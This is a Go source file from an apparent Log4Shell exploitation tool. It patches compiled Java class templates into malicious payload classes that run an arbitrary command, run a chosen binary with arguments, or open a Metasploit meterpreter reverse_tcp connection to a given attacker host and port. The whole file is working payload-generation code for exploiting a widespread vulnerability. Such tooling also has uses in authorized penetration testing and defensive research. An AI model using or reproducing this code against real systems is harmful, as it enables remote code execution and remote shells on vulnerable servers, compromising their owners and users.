package log4shell

import (
	"bytes"
	"encoding/binary"
	"strconv"

	"github.com/pkg/errors"
)

// GenerateExecute is used to generate class file for execute command.
func GenerateExecute(template []byte, command, class string) ([]byte, error) {
	const (
		fileName    = "Execute.java"
		commandFlag = "${cmd}"
		className   = "Execute\x01"
		uint16Size  = 2
	)

	err := checkJavaClass(template)
	if err != nil {
		return nil, err
	}

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileName))
	if fileNameIdx == -1 {
		return nil, errors.New("failed to find file name in execute template")
	}
	commandIdx := bytes.Index(template, []byte(commandFlag))
	if commandIdx == -1 {
		return nil, errors.New("failed to find command flag in execute template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 {
		return nil, errors.New("failed to find class name in execute template")
	}

	// check arguments
	if command == "" {
		return nil, errors.New("empty command")
	}
	if class == "" {
		class = "Execute"
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-uint16Size])
	newFileName := class + ".java"
	size := beUint16ToBytes(uint16(len(newFileName)))
	output.Write(size)
	output.WriteString(newFileName)

	// change command
	output.Write(template[fileNameIdx+len(fileName) : commandIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(command)))
	output.Write(size)
	output.WriteString(command)

	// change class name
	output.Write(template[commandIdx+len(commandFlag) : classNameIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)

	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

// GenerateSystem is used to generate class file for execute command with arguments.
func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, error) {
	const (
		fileName     = "System.java"
		binaryFlag   = "${bin}"
		argumentFlag = "${args}"
		className    = "System\x01"
		uint16Size   = 2
	)

	err := checkJavaClass(template)
	if err != nil {
		return nil, err
	}

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileName))
	if fileNameIdx == -1 {
		return nil, errors.New("failed to find file name in system template")
	}
	binaryIdx := bytes.Index(template, []byte(binaryFlag))
	if binaryIdx == -1 {
		return nil, errors.New("failed to find binary flag in system template")
	}
	argumentIdx := bytes.Index(template, []byte(argumentFlag))
	if argumentIdx == -1 {
		return nil, errors.New("failed to find argument flag in system template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 {
		return nil, errors.New("failed to find class name in system template")
	}

	// check arguments
	if binary == "" {
		return nil, errors.New("empty binary")
	}
	if class == "" {
		class = "System"
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-uint16Size])
	newFileName := class + ".java"
	size := beUint16ToBytes(uint16(len(newFileName)))
	output.Write(size)
	output.WriteString(newFileName)

	// change binary
	output.Write(template[fileNameIdx+len(fileName) : binaryIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(binary)))
	output.Write(size)
	output.WriteString(binary)

	// change argument
	output.Write(template[binaryIdx+len(binaryFlag) : argumentIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(arguments)))
	output.Write(size)
	output.WriteString(arguments)

	// change class name
	output.Write(template[argumentIdx+len(argumentFlag) : classNameIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)

	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

// GenerateReverseTCP is used to generate class file for
// meterpreter: payload/java/meterpreter/reverse_tcp.
func GenerateReverseTCP(template []byte, host string, port uint16, token, class string) ([]byte, error) {
	const (
		fileName   = "ReverseTCP.java"
		hostFlag   = "${host}"
		portFlag   = "${port}"
		tokenFlag  = "${token}"
		className  = "ReverseTCP\x0C"
		uint16Size = 2
	)

	err := checkJavaClass(template)
	if err != nil {
		return nil, err
	}

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileName))
	if fileNameIdx == -1 {
		return nil, errors.New("failed to find file name in reverse_tcp template")
	}
	hostIdx := bytes.Index(template, []byte(hostFlag))
	if hostIdx == -1 {
		return nil, errors.New("failed to find host flag in reverse_tcp template")
	}
	portIdx := bytes.Index(template, []byte(portFlag))
	if portIdx == -1 {
		return nil, errors.New("failed to find port flag in reverse_tcp template")
	}
	tokenIdx := bytes.Index(template, []byte(tokenFlag))
	if tokenIdx == -1 {
		return nil, errors.New("failed to find token flag in reverse_tcp template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 {
		return nil, errors.New("failed to find class name in reverse_tcp template")
	}

	// check arguments
	if host == "" {
		return nil, errors.New("empty host")
	}
	if port == 0 {
		return nil, errors.New("zero port")
	}
	if token == "" {
		token = randString(8)
	}
	if class == "" {
		class = "ReverseTCP"
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-uint16Size])
	newFileName := class + ".java"
	size := beUint16ToBytes(uint16(len(newFileName)))
	output.Write(size)
	output.WriteString(newFileName)

	// change host
	output.Write(template[fileNameIdx+len(fileName) : hostIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(host)))
	output.Write(size)
	output.WriteString(host)

	// change port
	output.Write(template[hostIdx+len(hostFlag) : portIdx-uint16Size])
	portStr := strconv.FormatUint(uint64(port), 10)
	size = beUint16ToBytes(uint16(len(portStr)))
	output.Write(size)
	output.WriteString(portStr)

	// change token(random)
	output.Write(template[portIdx+len(portFlag) : tokenIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(token)))
	output.Write(size)
	output.WriteString(token)

	// change class name
	output.Write(template[tokenIdx+len(tokenFlag) : classNameIdx-uint16Size])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)

	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

func checkJavaClass(template []byte) error {
	if len(template) < 4 {
		return errors.New("invalid Java class template file size")
	}
	if !bytes.Equal(template[:2], []byte{0xCA, 0xFE}) {
		return errors.New("invalid Java class template file")
	}
	return nil
}

func beUint16ToBytes(n uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, n)
	return b
}
